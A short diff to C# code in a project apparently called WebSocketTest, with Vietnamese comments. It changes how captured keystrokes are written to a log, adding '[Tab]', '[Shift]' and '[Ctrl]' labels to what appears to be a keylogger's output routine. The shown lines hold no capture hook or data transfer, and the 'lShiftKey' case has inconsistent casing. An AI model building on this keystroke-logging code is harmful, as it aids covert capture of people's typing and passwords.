@@ -138,7 +138,7 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
                                 case Keys.Space: sw.Write(" "); break;
                                 case Keys.Return: sw.Write("\n"); break;
                                 case Keys.Back: sw.Write("[Backspace]"); break;
-                                case Keys.Tab: sw.Write("\t"); break;
+                                case Keys.Tab: sw.Write("[Tab]"); break;
                                 default:
                                     // Logic xử lý chữ hoa/thường
                                     if (key.Length == 1) // Ký tự A-Z, 0-9
@@ -171,6 +171,10 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
                                             case "D7": sw.Write(shift ? "&" : "7"); break;
                                             case "D8": sw.Write(shift ? "*" : "8"); break;
                                             case "D9": sw.Write(shift ? "(" : "9"); break;
+                                            case "lShiftKey": sw.Write("[Shift]"); break;
+                                            case "rShiftKey": sw.Write("[Shift]"); break;
+                                            case "LControlKey": sw.Write("[Ctrl]"); break;
+                                            case "RControlKey": sw.Write("[Ctrl]"); break;
                                             default:
                                                 // Ghi tên phím khác dưới dạng [KeyName]
                                                 sw.Write($"[{key}]");
